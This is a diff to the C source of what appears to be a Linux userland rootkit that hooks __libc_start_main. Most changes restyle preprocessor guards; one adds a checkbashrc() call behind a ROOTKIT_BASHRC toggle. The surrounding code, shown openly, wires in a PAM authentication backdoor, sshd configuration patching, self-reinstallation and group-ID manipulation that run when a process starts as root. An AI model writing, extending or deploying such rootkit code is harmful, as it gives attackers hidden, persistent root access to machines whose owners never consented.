@@ -1,23 +1,23 @@
 #define _GNU_SOURCE
 
-#include "toggles.h"
+#include "config.h"
 
-#if !defined(USE_PAM_BD) && defined(PATCH_SSHD_CONFIG)
+#if !defined USE_PAM_BD && defined PATCH_SSHD_CONFIG
 #error "USE_PAM_BD is not defined while PATCH_SSHD_CONFIG is."
 #endif
-#if defined(USE_PAM_BD) && !defined(PATCH_SSHD_CONFIG)
+#if defined USE_PAM_BD && !defined PATCH_SSHD_CONFIG
 #warning "USE_PAM_BD is enabled without PATCH_SSHD_CONFIG."
 #endif
 
-#if defined(READ_GID_FROM_FILE) && !defined(BACKDOOR_UTIL)
+#if defined READ_GID_FROM_FILE  && !defined BACKDOOR_UTIL
 #warning "GID changing is not safely possible without BACKDOOR_UTIL defined."
 #endif
 
-#if !defined(READ_GID_FROM_FILE) && defined(AUTO_GID_CHANGER)
+#if !defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
 #error "AUTO_GID_CHANGER defined without READ_GID_FROM_FILE"
 #endif
 
-#if defined(BACKDOOR_PKGMAN) && !defined(BACKDOOR_UTIL)
+#if defined BACKDOOR_PKGMAN && !defined BACKDOOR_UTIL
 #error "BACKDOOR_PKGMAN defined without BACKDOOR_UTIL"
 #endif
 
@@ -57,7 +57,7 @@
 #include <utmpx.h>
 #endif
 
-#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
+#if defined USE_PAM_BD || defined LOG_LOCAL_AUTH
 #include <security/pam_ext.h>
 #include <security/pam_appl.h>
 #include <security/pam_modules.h>
@@ -79,13 +79,16 @@ int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_
     if(not_user(0))
         goto do_libc_start_main;
 
-#ifdef AUTO_GID_CHANGER
+#ifdef ROOTKIT_BASHRC
+    checkbashrc();
+#endif
+#if defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
     gidchanger();
 #endif
 #ifdef DO_REINSTALL
     reinstall();
 #endif
-#if defined(USE_PAM_BD) && defined(PATCH_SSHD_CONFIG)
+#if defined USE_PAM_BD && defined PATCH_SSHD_CONFIG
     sshdpatch(REG_USR);
 #endif
 
